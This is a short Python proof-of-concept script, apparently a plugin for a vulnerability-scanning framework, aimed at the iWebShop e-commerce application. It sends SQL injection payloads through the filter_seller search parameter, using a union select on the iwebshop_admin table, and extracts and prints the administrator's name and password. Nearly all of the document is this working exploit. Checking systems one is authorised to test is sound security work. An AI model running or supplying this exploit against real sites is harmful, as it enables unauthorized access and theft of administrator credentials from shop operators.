from lib.core.data import target
import requests
import re


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()

        p = re.compile("(?<=parent.searchSellerCallback\(\")(.*)(?=\")")

        payload = "?controller=block&action=filter_seller&search[1>2 union select(%s)from iwebshop_admin limit 0,1 -- +]=1"
        getAdminName = payload % "admin_name"
        url1 = target.url + getAdminName
        r = requests.get(url1)
        adminName = re.search(p, r.text.encode(r.encoding)).group(0)
        print("[*] Get the admin name: " + adminName)

        getAdminPassword = payload % "password"
        url2 = target.url + getAdminPassword
        r = requests.get(url2)
        adminPassword = re.search(p, r.text.encode(r.encoding)).group(0)
        print("[*] Get the admin password: " + adminPassword)

    except KeyError as e:
        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
